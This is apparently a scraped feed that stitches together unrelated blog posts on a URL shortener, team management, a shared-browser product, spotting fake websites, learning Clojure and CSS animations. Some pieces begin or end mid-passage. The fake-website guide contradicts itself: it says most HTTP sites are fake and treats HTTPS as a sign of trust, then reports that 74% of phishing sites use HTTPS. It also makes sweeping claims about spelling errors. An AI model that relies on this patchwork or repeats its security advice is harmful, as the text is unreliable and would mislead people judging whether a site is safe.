<p>And yes, I can transliterate my newly acquired, two-years-paid-up-front URL, and read it as label, but it’s a hell of a thing to type in when using an on-screen Russian keyboard on my <a href="https://nib.by/gpd-p2-max-ultrabook-cyberdeck-review/"> teeny tiny laptop</a>. And it completely misses the point of creating a short, easily memorable address to transmit verbally - at least to a more Western audience.</p>

<p>So this is my new effort. <a href="https://nib.by/">nib.by</a>. Nibby. Likened to the nib of a pen. Nibby. It kind of rolls of the tongue, and despite containing more letters than I originally sought, I’m pretty happy.</p>

<h2>DIY or ready made?</h2>

<p>The Crow is a ‘roll your own’ kind of bird, and my natural instinct was to string something together with elastic bands, a collection of scripts, and some symbolic links - all operated by altering a text file in my <a href="https://www.cyberpunks.com/cloud-storage-raspberry-pi/">Nextcloud</a>. That’s exactly the sort of <a href="https://nib.by/comments-on-a-self-hosted-static-site-its-simpler-than-you-think/">hacky solution</a> I usually prefer.</p>

<p>I was actually quite excited at the prospect of rigging this system, up but it occurred to me in the time I had that spent planning the awesome Heath Robinson affair, I could have simply spun up a ready-made solution</p>

<p>It’s now running the excellent and no-fuss <a href="https://polrproject.org/">Polr</a> URL shortening software, which took all of 15 minutes to install and configure on my <a href="https://amzn.to/3omPTEM">Raspberry Pi</a>, and is now proudly part of The Crow’s self-hosted stable.</p>

<p>Long term, I have no idea how I’m going to use this, or how much, or even if I’m going to open it up to other users.</p>

<p>The domain name might end up as something else entirely. I don’t know.</p>

<p>In the meantime, watch out for more posts with a short nib.by URL.</p>

<p>The URL for this post is <a href="https://nib.by/1">nib.by/1</a>, bringing 74 characters down to eight. How neat is that?</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>One of the most important dimensions on which teams differ is the degree to which they’re proactive vs. reactive.</p>

<p>Proactive teams operate primarily by strategizing, and then methodically executing on their plans. Think of teams such as User Research which conduct research and synthesize it into results, ideally building repeatable frameworks and reusable outputs along the way.</p>

<p>Reactive teams operate by rapidly assessing, deciding, and executing on new needs, typically due to external factors. They often follow playbooks for efficiency purposes, and are skilled at responding rapidly to changing information. They favor quick-thinking and the ability to juggle multiple competing priorities.</p>

<p>At a technology company, Design is the team that I usually think of as the most proactive. There are never really “Design Emergencies,” and even typing that phrase feels weird. Content Marketing is another example – it’s very rare that the business urgently requires a thought leadership piece. On the most reactive end of the spectrum are teams such as Support or Customer Success which need to respond to customers situations. These teams live in reaction-land, and need to quickly think on their feet and contend with unpredictable workloads.</p>

<p>Most teams fall somewhere in the middle. For example, much of the work that a PR team does is proactive, such as placing stories and building industry relationships. But there are also PR emergencies that demand immediate reaction – if your CEO gets indicted, your PR team doesn’t just get to go home at 5pm. Many enterprise SaaS teams such as Revenue Operations also fall in the middle. The day-to-day of a RevOps team consists of many reactive steps to advance ongoing deal cycles, but these teams also do the proactive work of mapping sales territories, setting up Salesforce processes, and more.</p>

<p>The most important factors to consider on the proactive &lt;&gt; reactive spectrum are:</p>

<ul>
  <li>Reactive work tends to happen right where you make money: making customers happy, selling new deals, or doing damage control (eg, to keep the servers running or combat a PR issue). <em>If you aren’t sufficiently reactive, you will let the business down.</em></li>
  <li>Your ability to scale as a department will largely be driven by proactive steps that you take to add efficiency. <em>If you aren’t sufficiently proactive, you won’t be able to level up and scale.</em></li>
</ul>

<h2 id="should-your-team-be-proactive-or-reactive">Should Your Team Be Proactive or Reactive?</h2>

<p>Given that businesses demand varying levels of reactivity from teams, and that proactively improving processes is how you scale, it’s imperative to know how you should balance your time.</p>

<p>If you’re a Support team and try to dedicate 70% of your Support reps’ time to scaling, you’ll quickly let down your customers. Indexing too hard on proactive work and allowing reactive work to languish leads to the type of leaders who self-brand as “visionaries” with lots of good ideas, but who ultimately fail because they can’t keep the lights on.</p>

<p>On the other hand, if your Product Management team spends 70% of its time reacting to the latest customer request, you’ll build a terrible product. This leads to the opposite case – great tactical leaders who get lots of small incremental wins, but who ultimately can’t scale their organizations to the next level of growth because they never identify step-function improvements to their organization.</p>

<p>As a result, the first thing to keep in mind about the proactive &lt;&gt; reactive dimension is that you need to figure out where on the spectrum your team should ideally fall. I’ve made a horrifically ugly graphic below to help illustrate this:</p>

<p><img src="https://staysaasy.com/assets/proactive_reactive/proactive-reactive.png" alt="The proactive <> reactive spectrum"></p>

<h2 id="establishing-your-spot-on-the-spectrum">Establishing Your Spot on the Spectrum</h2>

<p>Once you know where on the spectrum your team should fall, you need to take practical steps to gain and maintain that position in a scalable way.</p>

<p>For example, product, engineering, and design teams are ideally joined at the hip and operate more like a single function than a set of disparate departments. My favorite example: I view it as one of the key roles of a successful product management function to enable engineering to operate with the right level of proactivity. There are a few ways that this works:</p>

<ul>
  <li>By laying out a well-prioritized and explainable roadmap, you buffer engineering and design teams from switching projects all the time when a new customer need or executive opinion arises.</li>
  <li>By working with design to set up a solid product development lifecycle, you prevent engineers from needing to react to changing requirements as features are being built.</li>
  <li>By hiring people with strong communication skills, you can help engineering with communications and more quickly resolve their most painful reactive needs: for example, responding to production incidents or customer questions.</li>
</ul>

<p>Below are a number of different techniques to maintain your desired zone on the proactive &lt;&gt; reactive spectrum:</p>

<ul>
  <li>Highly reactive teams can add a more proactive muscle by carving out explicit, defensible time for leveling up their operations. For example, establish a single goal per month/quarter (“revamp the performance management and compensation process”) and make sure that you defend this one beachhead vigorously. This proactive time should remain inviolate for everything but the largest emergencies.</li>
  <li>Conversely, proactive teams can use techniques such as on-call rotations to serve as a reactive buffer for an otherwise proactive organization. This prevents ad hoc needs from creating inefficiencies when a team focused on long-term projects constantly has bits and pieces of attention chipped away without a triage process.</li>
  <li>Setting clear expectations can go a long way as well. For example, you should tell a Customer Success Manager, Account Executive, or Site Reliability Engineer that they’ll be expected to work late if an urgent customer issue arises (and of course these teams should be compensated appropriately). By contrast, you should set the expectation with your Product Managers that they can’t react and change course with every new piece of customer feedback.</li>
</ul>

<h2 id="the-spectrum-determines-how-teams-collaborate">The Spectrum Determines How Teams Collaborate</h2>

<p>And finally, once you’ve gotten your own house in order, you should consider the proactive/reactive spectrum in how you work with <em>other</em> teams. Team interactions work best when you understand how other teams operate, and design collaboration accordingly.</p>

<p>The degree to which a team is proactive or reactive will dominate its operating rhythm. For example, if you’re working with a Design team, you should expect them to be highly proactive and have detailed long-term plans. It’s best to get alignment and long-term ownership for what you need done so that they can work it into their multi-quarter or even multi-year vision for the future evolution of your product. Conversely, if you need to work with a Support team, they can probably help you with anything that you need on short notice but will likely not have the ability to commit to multi-year plans the way that a Product or Design team might.</p>

<p>Understanding the dynamics of how teams naturally operate can help big cross-team projects get done more efficiently, which is one of the hardest challenges at a startup. By considering where you need to fall on this spectrum, and defending your place there, you can help your team operate more effectively with minimal drama.</p>

<h2 id="takeaways">Takeaways</h2>

<ul>
  <li>All teams naturally fall on a spectrum of reactive to proactive – you need to understand your position.</li>
  <li>If you’re too reactive, you’ll never level up and scale. If you’re too proactive, you won’t respond sufficiently well to business-critical needs.</li>
  <li>Use techniques like explicit time carve outs (to be more proactive), on-call rotations (to be more reactive), and good expectation setting to defend your spot on the proactive &lt;&gt; reactive continuum.</li>
  <li>For best results, consider other teams’ place on the spectrum when collaborating.</li>
</ul>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article data-v-4ec71bb5=""> <section data-v-4ec71bb5=""><div data-v-69a15e8e="" data-v-4ec71bb5=""><div data-v-69a15e8e="" data-v-4ec71bb5=""><p>Even before the COVID- 19 pandemic occurred, many businesses had already started the transition to remote work. <a href="https://www.blueface.com/blog/infographic-2018-bct-report-key-takeaways/">BlueFace</a>, a predominant telecommunication company, &nbsp; predicted in 2018 that remote working would compete with office locations by 2025. The same report has also found that 78% of businesses already allowed remote working. Those who have shifted to remote work, whether due to the pandemic or not, rely heavily on screen sharing and video conferencing.</p><p><strong>As remote work becomes the new normal, it has become all the more important for companies to invest in tools and software that improve collaboration and workflow.</strong></p><p>Unfortunately, screen sharing capabilities are no longer enough, especially for complicated projects. Screen sharing is limited to two separate types of users: the sharer, or the screen controller, and the receiver, or viewer, of the screen share. If during a presentation a viewer needs more time to process the information, the dreaded awkward dance of “oh, could you go back to that section up there” thus ensues.</p><p>For projects that require collaboration by multiple participants, a Shared Browser is the best option. So what exactly is the difference between a Shared Browser and screen sharing?</p><p>Most of us are familiar with screen sharing. This is often done when another party needs needs to see to your computer or screen. For instance, screen sharing is often used when you do a presentation or for online learning. Or maybe your teammate needs to add his or her input on a project you are working on. However, only one person can control what happens on the screen.</p><p>A <a href="https://remotehq.co/3i9xedO">Shared Browser</a>, on the other hand, lets you co-browse and co-control any web page with multiple users. This cloud-based browser allows users to click, scroll, and type at the same time during a single session. Instead of providing instructions to the sharer on what to do on the page, you can do the actions yourself. It makes the process a lot faster and smoother.</p><figure><img src="https://images.storychief.com/account_26161/shutterstock_1694214799_4f89c6605d7c153737c41284020f89b8_800.jpg" alt="ditch screen sharing and succeed with shared browser"></figure><p>A Shared Browser can be used in instances where screen sharing is not enough. Here are some of the common applications of Shared Browser:</p><h3 id="1-sales-demos">1. Sales Demos</h3><p><a href="https://remotehq.co/3pswhQZ">Virtual sales demos</a> using a Shared Browser allow the prospective buyer to freely explore the product or service being featured. An <a href="https://remotehq.co/39pXzBG">interactive demo</a> also makes the buyer feel more engaged, thus increasing sales conversion. Guests can have the power to click around. However, this is only if/when you want guests to have control and edit access - you can change the permissions of Shared Browser at any time.</p><h3 id="2-tech-support">2. Tech Support</h3><p>Screen sharing used to be the common form of troubleshooting tech problems. With a Shared Browser, troubleshooting becomes a lot easier. Instead of giving out instructions, which often lead to misunderstandings, a tech support specialist can carry out the fixes themselves.</p><h3 id="3-training-and-onboarding">3. Training and Onboarding</h3><p>You can turn passive sessions into <a href="https://remotehq.co/2YrlqL0">active ones</a>, making the learning process much more engaging. Instead of showing your participants the way, you can let them take action and learn by doing.</p><h3 id="4-visitor-assistance">4. Visitor Assistance</h3><p>Does your website visitor have difficulty accessing certain pages of your website? Is your online shopper having trouble finding the right product or checking out? A Shared Browser provides a more personalized experience for every single customer or visitor on your website.</p><h3 id="5-real-time-support">5. Real-Time Support</h3><p>Online banking apps and other finance apps have made transactions digital. But we all know that finance is an industry that is difficult to navigate. Providing <a href="https://remotehq.co/3iXyy46">support in real-time</a> using a Shared Browser can improve sales, conversion, and customer satisfaction.</p><h3 id="6-internal-team-collaboration">6. Internal Team Collaboration</h3><p>If you’re <a href="https://remotehq.co/3puBzeL">working with a remote team</a> on a specific project, asking for input or revisions is a lot faster using Shared Browser. You can even do the changes in real-time, cutting down the waiting period, and streamlining the planning or designing process.</p><p>As long as there is a need for digital communication between two or more parties, Shared Browsers can be used to bridge that gap.</p><p>We have established the differences between Shared Browser and screen sharing. But why does a Shared Browser work better than simple screen sharing? Here are the main reasons:</p><ul><li><strong>It is interactive</strong>. Instead of just watching the sharer click around, the other participants can also click around and explore.</li><li><strong>It is engaging.</strong> Participating in a Shared Browser session is more engaging than participating in a passive screen sharing session.</li><li><strong>Faster troubleshooting.</strong> Instead of telling the sharer what to do to fix the problem, you can take over the session and do the troubleshooting yourself.</li><li><strong>Clearer communication.</strong> No more guessing which button to click or which link to follow.</li></ul><p>Overall, Shared Browser is more performant than traditional screen sharing --minus the hassle and huge bandwidth usage of a traditional screen share. The <a href="https://remotehq.co/3oIVLsQ">power of Shared Browser</a> has a wide range.</p><figure><img src="https://images.storychief.com/account_26161/ScreenShot2021-01-19at2_08_03PM_6ca670713d0f09e78fa3d7cbb6b4a765_800.jpg" alt="RemoteHQ shared browser"></figure><p>Shared Browsers are one of the features offered by <a href="https://remotehq.co/2LNIUXz">RemoteHQ</a>, a company that specializes in remote collaboration by creating interactive sandboxed environments. A Shared Browser turns any website instantly collaborative, making it easier for participants to communicate and work remotely.</p><p>What makes the RemoteHQ Shared Browser effective?</p><h3 id="cloud-based">Cloud-Based</h3><p>When a user creates a Shared Browser session, a webpage is created that is not saved on either computer. The users can browse and edit the webpage secure because no digital trail is left for other entities to follow.</p><h3 id="no-additional-app">No Additional App</h3><p>With screen sharing, you need to download an app that would allow you to share your screen with other users. Zoom, Skype, Team Viewer, AnyDesk, Screenleap, Chrome Remote Desktop, GoToMeeting, and Cisco WebEx are just some of the popular screen sharing apps today. A Shared Browser, on the other hand, is entirely browser and cloud-based. No need to download, install, and maintain any software. Just click a URL link and you’ll be able to join any meeting!</p><h3 id="adjustable-permission-settings">Adjustable Permission Settings</h3><p>You can choose the permissions model you want to apply. You can make your session private, view-only, or editable by all the participants. This way, you are always in control of who can see and engage with your Shared Browser.</p><h2 id="what-s-next-ditch-screen-sharing-">What’s Next? Ditch Screen Sharing!</h2><p>Shared Browsers take screen sharing to the next level. As the demand for better and smoother collaborative tools increases, the Shared Browser will make it easier for teams and companies to continue working remotely. <a href="https://remotehq.co/3iT92Nq">Try it for free today</a>!</p></div></div></section></article></div>]]>

Review the URL</b></h3><p><span>The first vital issue that you should be looking out for in your quest to detect legitimate websites is the website’s address bar. There are several address bar-based features that you should be looking out for. To begin with, the URL of the website. Legitimate website owners will dearly value the security of their clients’ data and will put in place measures to ensure this is achieved. The </span><a href="https://www.cheapsslshop.com/"><span>SSL certificate</span></a><span> ensures that their clients’ communication and servers remain encrypted and out of reach by cybercriminals.</span></p><p><a href="https://i0.wp.com/secureblitz.com/wp-content/uploads/2021/02/Review-the-URL.png?ssl=1"><img loading="lazy" src="https://i0.wp.com/secureblitz.com/wp-content/uploads/2021/02/Review-the-URL.png?resize=640%2C400&amp;ssl=1" alt="Review the URL" width="640" height="400" srcset="https://i0.wp.com/secureblitz.com/wp-content/uploads/2021/02/Review-the-URL.png?w=640&amp;ssl=1 640w, https://i0.wp.com/secureblitz.com/wp-content/uploads/2021/02/Review-the-URL.png?resize=300%2C188&amp;ssl=1 300w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/secureblitz.com/wp-content/uploads/2021/02/Review-the-URL.png?w=640&amp;ssl=1 640w, https://i0.wp.com/secureblitz.com/wp-content/uploads/2021/02/Review-the-URL.png?resize=300%2C188&amp;ssl=1 300w" data-lazy-src="https://i0.wp.com/secureblitz.com/wp-content/uploads/2021/02/Review-the-URL.png?resize=640%2C400&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p><p><span>&nbsp;On the other hand, fake websites will not mind their data security and will see no need to install an SSL certificate. The question therefore is: how do you know whether or not a website has the certificate? The answer to that lies in the URL of the website in question. If the website’s address begins with HTTPS, you can be sure that the website is encrypted. If, on the other hand, the URL of the website starts with HTTP, then you have to be wary. You should note that not all HTTP websites are fake, but most of them are. 74% of phishing websites use the HTTPS protocol; this is according to the Research from the Anti-Phishing Working Group (APWG)</span></p><p><span>Still, on the address bar, you should also check on the availability of a padlock symbol. A secure website will display a small padlock next to the web address. The feature also allows you to find out more details about the website. You can click on the padlock symbol to learn more about the website. The availability of HTTPS does not guarantee that the website is secure and real, but it is a great starting point for detecting a website’s validity.&nbsp;</span></p><h3><b>2. Check the Reviews</b></h3><p><span>Product reviews and product ratings have proved to be useful tools that support consumer buying decisions. The reviews and ratings are also of great essence to the eCommerce stores as they help them build a reputable and trustworthy brand on the online market. Most reliable and legitimate websites will offer textual reviews of quantitative ratings or a blend of the two.&nbsp;</span></p><p><a href="https://i1.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-the-Reviews.jpg?ssl=1"><img loading="lazy" src="https://i1.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-the-Reviews.jpg?resize=640%2C376&amp;ssl=1" alt="Check the Reviews" width="640" height="376" srcset="https://i1.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-the-Reviews.jpg?w=640&amp;ssl=1 640w, https://i1.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-the-Reviews.jpg?resize=300%2C176&amp;ssl=1 300w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-the-Reviews.jpg?w=640&amp;ssl=1 640w, https://i1.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-the-Reviews.jpg?resize=300%2C176&amp;ssl=1 300w" data-lazy-src="https://i1.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-the-Reviews.jpg?resize=640%2C376&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p><p><span>Website reviews are essential information sources to anyone who wants to establish the legitimacy of a website. The reviews are generated by previous clients who have interacted with the websites and know more about the website. Previous clients who have had a wonderful experience with the website will state that in the reviews. Clients who have had a bad experience while interacting with the website will also state that in the reviews. Such a case should be a warning signal that the website could be fake and not what it says.&nbsp; If you meet such reviews, then you better stay safe by not interacting with the website.&nbsp;</span></p><p><span>It is also worth mentioning that some website owners will manipulate the reviews and customer feedback section so that their website looks legit. If you are not 100% confident with the reviews, then there is no need to share your confidential information with the website. It would help if you also were wary about websites that do not have reviews. There might be a reason as to why the website is hiding the reviews.&nbsp;</span></p><p><span>Finally, several popular review websites exist that you can visit to find out about the user experiences, scam warnings, and customer service quality. The websites include:</span></p><ul><li aria-level="1"><span>Tripadvisor</span></li><li aria-level="1"><span>Trustpilot</span></li><li aria-level="1"><span>Review center</span></li></ul><h3><b>3. Check Content-Type</b></h3><p><a href="https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-Content-Type.jpg?ssl=1"><img loading="lazy" src="https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-Content-Type.jpg?resize=640%2C423&amp;ssl=1" alt="Check Content-Type" width="640" height="423" srcset="https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-Content-Type.jpg?w=640&amp;ssl=1 640w, https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-Content-Type.jpg?resize=300%2C198&amp;ssl=1 300w, https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-Content-Type.jpg?resize=177%2C118&amp;ssl=1 177w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-Content-Type.jpg?w=640&amp;ssl=1 640w, https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-Content-Type.jpg?resize=300%2C198&amp;ssl=1 300w, https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-Content-Type.jpg?resize=177%2C118&amp;ssl=1 177w" data-lazy-src="https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-Content-Type.jpg?resize=640%2C423&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p><p><span>Paying keen attention to how the website content is written could help you detect fake websites. Every computer has a simple dictionary that will help the content creator develop grammatically correct and spelling free content. Additionally, every web browser is built with a spell checker tool; this leaves a website owner without an excuse for creating poorly written content. The presence of errors in content should raise eyebrows. It could be that the content was hastily written with the sole intent of stealing money from unsuspecting website visitors.&nbsp;</span></p><p><span>If a website has grammatical errors, spelling mistakes, and broken English, then there are high chances that the website could be fake. No reputable website will ever post poorly written content. A legitimate website will invest heavily in content creation. I advise you not to share your information with a website that has poorly written content. It could be a fake one.&nbsp;</span></p><h3><strong>4. Use Online Phishing Scanners</strong></h3><p><a href="https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Use-Online-Phishing-Scanners.jpg?ssl=1"><img loading="lazy" src="https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Use-Online-Phishing-Scanners.jpg?resize=640%2C371&amp;ssl=1" alt="Use Online Phishing Scanners" width="640" height="371" srcset="https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Use-Online-Phishing-Scanners.jpg?w=640&amp;ssl=1 640w, https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Use-Online-Phishing-Scanners.jpg?resize=300%2C174&amp;ssl=1 300w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Use-Online-Phishing-Scanners.jpg?w=640&amp;ssl=1 640w, https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Use-Online-Phishing-Scanners.jpg?resize=300%2C174&amp;ssl=1 300w" data-lazy-src="https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Use-Online-Phishing-Scanners.jpg?resize=640%2C371&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p><p><span>There are various phishing detection tools that you can use to detect fake websites. The tools will allow you to scan through a website and determine if the website and its content are genuine. No single tool has been able to give a definitive answer. It is, therefore, important to use multiple tools to build a picture. The tools are explained below.</span></p><ul><li aria-level="1"><a href="https://support.avg.com/SupportArticleView?l=en&amp;urlname=AVG-Threat-Lab-report-malware"><b>The AVG Threat Labs</b></a><span>–</span> <span>The tool allows you to type in the URL of the website you want to visit. You will then get an instant appraisal of the security of the website. The tool will detect any malware and viruses and report them to you. The presence of malware and viruses is enough to signal that the website could be fake or compromised, and so you should stay away from it.&nbsp;</span></li><li aria-level="1"><a href="https://isithacked.com/"><b>IsItHacked</b></a><span>– This tool will scan a website to detect any possibility that the website might be a phishing threat. It does this by checking the link cloaking, codes, and dubious link formatting. It is hence a great tool that you can use to detect fake websites.</span></li><li aria-level="1"><b>MXToolbox</b><span>– This tool checks various blacklists to identify if a website is in any of them. If the website you are about to visit appears here, then there are high chances that the website has been reported as a phishing or scam website. The best thing to do is to avoid visiting the website.&nbsp;</span></li><li aria-level="1"><b>PhishTank-</b><span> This website contains all the crowdsourced files from the compromised websites on the internet. It also includes a list of websites that have been set up to especially scam and steal information from unsuspecting victims. Once you have submitted a website that you wish to verify, you can track the website through a </span><a href="https://phishtank.com/"><span>PhishTank</span></a><span> account.&nbsp;</span></li></ul><h3><b>5. Check the Terms and Condition of the Website</b></h3><p><a href="https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-the-Terms-and-Condition-of-the-Website.jpg?ssl=1"><img loading="lazy" src="https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-the-Terms-and-Condition-of-the-Website.jpg?resize=640%2C426&amp;ssl=1" alt="Check the Terms and Condition of the Website" width="640" height="426" srcset="https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-the-Terms-and-Condition-of-the-Website.jpg?w=640&amp;ssl=1 640w, https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-the-Terms-and-Condition-of-the-Website.jpg?resize=300%2C200&amp;ssl=1 300w, https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-the-Terms-and-Condition-of-the-Website.jpg?resize=177%2C118&amp;ssl=1 177w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-the-Terms-and-Condition-of-the-Website.jpg?w=640&amp;ssl=1 640w, https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-the-Terms-and-Condition-of-the-Website.jpg?resize=300%2C200&amp;ssl=1 300w, https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-the-Terms-and-Condition-of-the-Website.jpg?resize=177%2C118&amp;ssl=1 177w" data-lazy-src="https://i2.wp.com/secureblitz.com/wp-content/uploads/2021/02/Check-the-Terms-and-Condition-of-the-Website.jpg?resize=640%2C426&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p><p><span>Most genuine websites will have real <a href="https://secureblitz.com/how-to-patiently-read-terms-and-conditions-agreement/">terms and conditions</a>. For instance, a legitimate eCommerce website will have a generous refund policy. If a website offers products, yet you cannot find its terms and conditions section, it is possible that the website cannot be trusted. If the eCommerce store explicitly excludes any possibility of a product refund, then you better not engage with such a website. You should also check the warranties for the commodities sold by the merchant. If there are no warranties provided, then there is a chance that the website is selling counterfeit products.&nbsp;</span></p><h2><b>Conclusion</b></h2><p><span>The number of fake websites and phishing websites has skyrocketed, especially in recent times.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>For a few last years I’ve been learning programming in various languages, on and off, with more or less success. Some languages that I’ve tried include Python, Java, Haskell and even JavaScript. And of course Clojure. But it has been going slowly, not because those languages (or programming in general) are hard. It’s because I lacked consistency in doing things on regular basis due to lack of time and energy; I’ve often been mentally exhausted at my regular IT work. Here’s how I finally managed to organize myself and actually started getting it!</p><h3 id="ancient-history">Ancient history</h3><p>I’ve been interested in computers for most of my life. It can be shortly described as ‘power user’ e.g. <em>system configuration, setup, various audio/video editing tools…</em>, but I’ve never really took up programming until 2017. (You can read about my contemporary views <a href="https://savo.rocks/posts/an-unexpected-toolbox-for-a-beginner-programmer/" target="_blank">here</a>). Back then I managed to learn some Python syntax, but it all came down to following the materials I have been learning from, and I gave up after some time. In the meantime I have been dabbling with various languages and technologies, but never crossed the chasm to serious work beyond tutorials and books.</p><h3 id="recent-development">Recent development</h3><p>When I wasn’t trying to learn programming I was playing guitar with various bands I had and worked in several companies on various positions in IT departments. Those positions included various tasks such as system administration &amp; maintenance, vendor coordination and even IT support call-center coordination. During that time I still managed to dabble with programming irregularly, mostly with Clojure because I liked how it doesn’t get in my way. It can be set up almost instantly and the syntax is very minimal, which lets me concentrate on shaping my ideas into code. But very often the workload was big enough to keep me from programming constantly, so I didn’t get very far. However, recently I decided to concentrate on programming, as I realized that it brings me much joy, even when I am completely lost in the process, because when I overcome obstacles it feels phenomenal.</p><h3 id="current-situation">Current situation</h3><p>I discovered a one-step-beyond-basics book that suits my needs perfectly: <a href="https://pragprog.com/titles/dswdcloj3" target="_blank">Web Development with Clojure</a> and bought a copy. I’m getting serious now :) Currently, the book is in beta, but it is expected to be finished very soon. This book shows in detail how to build modern web applications using various Clojure libraries. Clojure is different from other languages in that matter: it doesn’t have a <em>web-app framework</em>. Instead, the programmers combines various libraries which suit their particular needs.</p><h3 id="the-approach">The approach</h3><p>So, how is this time different than any other when I tried to learn programming? Read on.<br></p><ul><li>Walk the unwalked path: This time, instead of just following the book, I decided to explore the documentation of libraries that were introduced, and to try to experiment with them myself. There are often multiple libraries that serve the same purpose, and the author is kind enough to mention them in his book. One such example is two libraries for HTML templating: <a href="https://github.com/yogthos/Selmer" target="_blank">Selmer</a> which uses Django-like syntax, and <a href="https://github.com/weavejester/hiccup" target="_blank">Hiccup</a> which converts Clojure vectors to html, so <code>[:h1 "Hello There"]</code> becomes <code>&lt;h1&gt;Hello There&lt;/h1&gt;</code>. Hiccup-way seemed more attractive to me, so I decided to write the whole template in in, and I have learned more doing that, than I have ever learned following book-code. I was forced to try various approaches out, read the documentation, ask around online for solutions and in the end I felt I understand what I wrote much better.</li><li>Do things regularly: There is a wise saying which goes something like: <em>it is better to perform average every day, than to be excellent once in a while</em>. OK, it probably sounds better than I wrote it, but the point is there. I try to follow it, and to program every day for 6-8 hours. I realized that sometimes can be difficult to even start, so I start my programming day by doing <u>one</u> <a href="https://www.4clojure.com/" target="_blank">4clojure</a> exercise per day. This helps me to get <em>warmed-up</em> as I can start solving the problem immediately, because the tasks usually require just using the right Clojure function (or combination of functions), so I make sure to search this awesome <a href="https://jafingerhut.github.io/cheatsheet/clojuredocs/cheatsheet-tiptip-cdocs-summary.html" target="_blank">Clojure Cheatsheet</a> for the functions that I’ll use, and usually manage to find them. After that I just open my project, the book and code away!</li><li>Revisit previous chapters: I like to come back a little after some time to re-read previous materials to see if I’ll have new insight and maybe notice something that I missed the first time when I read the chapter. Usually there are <em>a-ha</em> moments, and makes this part very valuable in the process.</li></ul><p>The book guides reader through building a microblogging platform, kind of like a social network, where multiple users can have their message boards and interact with each other, have their feeds, etc. The first few chapters deal with crash-course setting up a page where all the messages are displayed (no multiple users), and the form for entering a message is present, then it moves on to teach about core components of a web app (creating web server, request routing, handling, middleware…), another chapter deals with what <a href="https://luminusweb.com/" target="_blank">Luminus</a> templating library provides, then it moves on to using ClojureScript for SPA approach, which teaches very powerful and modern concepts. I decided to build something like a <em>beer-log</em> application, where I will keep track of craft beers that I’ve tried. I wanted to do something different, rather than following book paren-for-paren. Who knows, maybe my beer app will someday be good as, I don’t know, <a href="https://untappd.com/" target="_blank">Untappd</a> maybe?</p></div></div>]]>

<figure><img src="https://simplabs.com/assets/images/posts/2021-01-29-web-animations-intro/illustration-aff5b1d9173b85afd265e83b6f744f81.svg#full"></figure><h2 id="the-status-quo-of-animating-the-web">The status quo of animating the web</h2>
<p>Currently, there are two animation techniques that are commonly used on the web:
CSS transitions/animations and animating through JavaScript by modifying inline
styles.</p>
<h3 id="css-transitions-and-animations">CSS transitions and animations</h3>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Transitions/Using_CSS_transitions" target="_blank" rel="noopener">CSS transitions</a>
are a basic but powerful way to define a transition between two CSS states of a
DOM element. They provide limited control, but due to their simplicity it's
often the preferred way to implement basic animations like hover effects on a
button. Transitions happen automatically between values of a CSS attribute with
a given timing function, delay and duration.</p>
<pre><code><span>.my-button</span> {
  <span>opacity</span>: <span>0.5</span>;
  <span>transition</span>: opacity <span>0.3s</span> linear;
}

<span>.my-button</span><span>:hover</span> {
  <span>opacity</span>: <span>1</span>;
